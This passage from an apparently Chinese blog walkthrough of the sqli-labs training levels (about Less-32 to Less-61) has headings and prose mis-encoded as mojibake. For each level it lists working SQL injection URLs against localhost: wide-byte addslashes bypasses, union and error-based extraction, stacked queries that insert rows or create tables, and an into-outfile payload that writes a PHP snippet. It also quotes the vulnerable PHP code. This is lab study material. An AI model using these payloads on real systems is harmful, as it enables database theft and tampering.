åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-34"><a href="#æ‰‹åŠ¨æ³¨å…¥-34" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-33/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-31"><a href="#æºç åˆ†æ-31" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-35"><a href="#æ‰‹åŠ¨æ³¨å…¥-35" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><img src="https://s2.loli.net/2022/05/17/sv6kSR8guHL12Dh.png" alt="34.png"></p><h3 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-36"><a href="#æ‰‹åŠ¨æ³¨å…¥-36" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-35/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-32"><a href="#æºç åˆ†æ-32" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-37"><a href="#æ‰‹åŠ¨æ³¨å…¥-37" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%EF%BF%BD&#x27;union <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-33"><a href="#æºç åˆ†æ-33" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-38"><a href="#æ‰‹åŠ¨æ³¨å…¥-38" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ç”¨burpå³å¯</p><h4 id="æºç åˆ†æ-34"><a href="#æºç åˆ†æ-34" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$passwd1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="Page-3-Stacked-Injections"><a href="#Page-3-Stacked-Injections" class="headerlink" title="Page-3  (Stacked Injections)"></a>Page-3  (Stacked Injections)</h2><h3 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 stacked Query</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-39"><a href="#æ‰‹åŠ¨æ³¨å…¥-39" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŠ å…¥ä¸€æ¡æ•°æ®</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-38/?id=1&#x27;;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;less38&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/FTXO3ltsWAHe6aS.png" alt="38.png"></p><h3 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 stacked Query Intiger type</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-40"><a href="#æ‰‹åŠ¨æ³¨å…¥-40" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-39/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;less39&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 stacked Query String type Blind</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-41"><a href="#æ‰‹åŠ¨æ³¨å…¥-41" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-40/?id=1&#x27;); <span class="attribute">insert</span> into users(id,username, password) values (<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;less40&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 stacked Query Intiger type blind</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-42"><a href="#æ‰‹åŠ¨æ³¨å…¥-42" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-41/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;less41&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-35"><a href="#æºç åˆ†æ-35" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-43"><a href="#æ‰‹åŠ¨æ³¨å…¥-43" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™;create table less42 like usersâ€“+</p><p><img src="https://s2.loli.net/2022/05/17/5ovkQSFNKgiWfdH.png" alt="42.png"></p><h3 id="less43-POST-Error-based-String-Stacked-with-tiwst-POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥"><a href="#less43-POST-Error-based-String-Stacked-with-tiwst-POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="less43 POST -Error based -String -Stacked with tiwst(POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥)"></a>less43 POST -Error based -String -Stacked with tiwst(POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-44"><a href="#æ‰‹åŠ¨æ³¨å…¥-44" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™);create table less43 like usersâ€“+</p><h3 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-45"><a href="#æ‰‹åŠ¨æ³¨å…¥-45" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™;create table less44 like usersâ€“+</p><h3 id="less-45-åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™-é—­åˆæ³¨å…¥"><a href="#less-45-åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™-é—­åˆæ³¨å…¥" class="headerlink" title="less-45 åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™)é—­åˆæ³¨å…¥"></a>less-45 åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™)é—­åˆæ³¨å…¥</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-46"><a href="#æ‰‹åŠ¨æ³¨å…¥-46" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™);create table less45 like usersâ€“+</p><h3 id="less-46-ORDER-BY-Error-Numeric"><a href="#less-46-ORDER-BY-Error-Numeric" class="headerlink" title="less-46 ORDER BY-Error-Numeric"></a>less-46 ORDER BY-Error-Numeric</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-47"><a href="#æ‰‹åŠ¨æ³¨å…¥-47" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-46/?sort=(<span class="attribute">select</span> count(*) from information_schema.columns group by concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand()*<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#ä¹Ÿå¯ä»¥å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-36"><a href="#æºç åˆ†æ-36" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-48"><a href="#æ‰‹åŠ¨æ³¨å…¥-48" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><img src="https://s2.loli.net/2022/05/17/qi8F1NCMIayvPrH.png" alt="47.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-47/?sort=1&#x27;<span class="attribute">into</span> outfile <span class="string">&quot;æ–‡ä»¶åœ°å€&quot;</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><h3 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-49"><a href="#æ‰‹åŠ¨æ³¨å…¥-49" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶æ³¨å…¥åŠå¯¹æ–‡ä»¶æ“ä½œå‡å¯ï¼Œé™¤ä¸èƒ½æŠ¥é”™æ³¨å…¥å¤–åŒLess-46</p><h3 id="Less49-ORDER-BY-Clause-Blind-based"><a href="#Less49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less49 - ORDER BY Clause Blind based"></a>Less49 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-50"><a href="#æ‰‹åŠ¨æ³¨å…¥-50" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>é™¤ä¸èƒ½æŠ¥é”™æ³¨å…¥å¤–åŒLess-47</p><h3 id="Less50-ORDER-BY-Clause-Blind-based"><a href="#Less50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less50 - ORDER BY Clause Blind based"></a>Less50 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-51"><a href="#æ‰‹åŠ¨æ³¨å…¥-51" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-50/?sort=1;<span class="attribute">create</span> table less50 like users</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VZUAQPF5jBvIJ8r.png" alt="50.png"></p><h3 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-52"><a href="#æ‰‹åŠ¨æ³¨å…¥-52" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-51/?sort=1&#x27;;<span class="attribute">create</span> table less51 like users--+</span><br></pre></td></tr></table></figure><h3 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-53"><a href="#æ‰‹åŠ¨æ³¨å…¥-53" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-52/?sort=1;<span class="attribute">create</span> table less52 like users</span><br></pre></td></tr></table></figure><h3 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-54"><a href="#æ‰‹åŠ¨æ³¨å…¥-54" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-53/?sort=1&#x27;;<span class="attribute">create</span> table less53 like users--+</span><br></pre></td></tr></table></figure><h2 id="Page-4-Challenges"><a href="#Page-4-Challenges" class="headerlink" title="Page-4  (Challenges)"></a>Page-4  (Challenges)</h2><h3 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-55"><a href="#æ‰‹åŠ¨æ³¨å…¥-55" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–è¡¨åcul94axau9</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–åˆ—åid,sessid,secret_B27K,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;cul94axau9&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–ç­”æ¡ˆ</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_B27K) from challenges.cul94axau9--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/1aoe3HdJVti8zqP.png" alt="54.png"></p><h3 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-56"><a href="#æ‰‹åŠ¨æ³¨å…¥-56" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–è¡¨åk6cm9525rm</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–åˆ—åid,sessid,secret_6TMN,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;k6cm9525rm&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–ç­”æ¡ˆ</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_6TMN) from challenges.k6cm9525rm--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/ScPXqw9oER13LjV.png" alt="55.png"></p><h3 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-57"><a href="#æ‰‹åŠ¨æ³¨å…¥-57" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æœ¬å…³ä½¿ç”¨<code>(&#39;&#39;)</code>å¤„ç†è¾“å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-56/?id=-1&#x27;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-37"><a href="#æºç åˆ†æ-37" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-58"><a href="#æ‰‹åŠ¨æ³¨å…¥-58" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æœ¬å…³ä½¿ç”¨<code>&quot;&quot;</code>å¤„ç†è¾“å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-57/?id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-38"><a href="#æºç åˆ†æ-38" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-59"><a href="#æ‰‹åŠ¨æ³¨å…¥-59" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-58/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-60"><a href="#æ‰‹åŠ¨æ³¨å…¥-60" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-59/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-39"><a href="#æºç åˆ†æ-39" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-61"><a href="#æ‰‹åŠ¨æ³¨å…¥-61" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-60/?id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-40"><a href="#æºç åˆ†æ-40" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-62"><a href="#æ‰‹åŠ¨æ³¨å…¥-62" class="headerlink" 